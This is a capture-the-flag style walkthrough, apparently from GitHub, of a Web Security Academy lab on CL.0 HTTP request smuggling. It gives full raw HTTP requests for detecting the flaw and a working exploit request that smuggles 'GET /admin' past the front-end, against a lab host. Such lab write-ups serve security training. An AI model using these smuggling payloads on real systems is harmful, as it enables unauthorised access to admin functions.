Title: CL.0 request smuggling
Level: PRACTITIONER
Desc:  This lab is vulnerable to CL.0 request smuggling attacks. The back-end server ignores the Content-Length header on requests to some endpoints.
To solve the lab, identify a vulnerable endpoint, smuggle a request to the back-end to access to the admin panel at /admin, then delete the user carlos.

# Walkthrough:
Finding endpoint vulnerable to CL.0 :
1. add 2 same GET requests to repeater
2. add those request to group and set send option as "send group single connection"
3. change First request: change method to POST, add `Connection: keep-alive` add Content-Length header with proper value and add 2 lines as body `GET /nonexistent HTTP/1.1` AND `Foo: x`

When the second response is 404 Not Found that means that we have found vulnerable endpoint.

<img width="1267" height="473" alt="image" src="https://github.com/user-attachments/assets/4c821a0f-de82-4edd-a38f-4cc084bb03c1" />
<img width="1218" height="448" alt="image" src="https://github.com/user-attachments/assets/f6646474-52d6-4ad7-b8ca-fc370522b79e" />

First request: 
```
POST /resources/images/blog.svg HTTP/2
Host: 0a850074042e7ab987bf0728005f009e.web-security-academy.net
Cookie: session=ETGMcRJnH5I6UecsJGDFw8SS7VYp0vz5
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a850074042e7ab987bf0728005f009e.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=2, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

GET /nonexistent HTTP/1.1
Foo: x
```

Second request:
```
GET /resources/images/blog.svg HTTP/2
Host: 0a850074042e7ab987bf0728005f009e.web-security-academy.net
Cookie: session=ETGMcRJnH5I6UecsJGDFw8SS7VYp0vz5
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a850074042e7ab987bf0728005f009e.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=2, i


```


Exploitation:
It is easy, you just change body of first request: 
```
POST /resources/images/blog.svg HTTP/2
Host: 0a850074042e7ab987bf0728005f009e.web-security-academy.net
Cookie: session=ETGMcRJnH5I6UecsJGDFw8SS7VYp0vz5
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a850074042e7ab987bf0728005f009e.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=2, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

GET /admin HTTP/1.1
Foo: x
```





